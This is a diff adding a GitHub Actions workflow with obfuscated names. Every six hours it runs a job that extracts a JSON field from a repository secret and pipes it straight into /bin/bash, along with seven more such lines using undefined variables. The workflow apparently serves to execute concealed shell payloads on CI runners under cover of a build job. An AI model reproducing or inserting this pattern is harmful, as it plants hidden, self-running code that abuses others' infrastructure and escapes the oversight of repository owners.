@@ -1,0 +1,25 @@
+name: sugaolvli
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: sugaolvli
+        env:
+          r276: ${{ secrets.r276 }}
+        run: |
+          echo $r276 | jq -r .qh6 | /bin/bash
+          echo $mlzv2992 | jq -r .pidbd5 | /bin/bash
+          echo $jymta68359 | jq -r .b1728 | /bin/bash
+          echo $xex450 | jq -r .rf80083 | /bin/bash
+          echo $hxstk445 | jq -r .iyrk201 | /bin/bash
+          echo $unsuk53 | jq -r .cmra67160 | /bin/bash
+          echo $bh71232 | jq -r .ba5844 | /bin/bash
+          echo $ket77 | jq -r .lnu1024 | /bin/bash
+
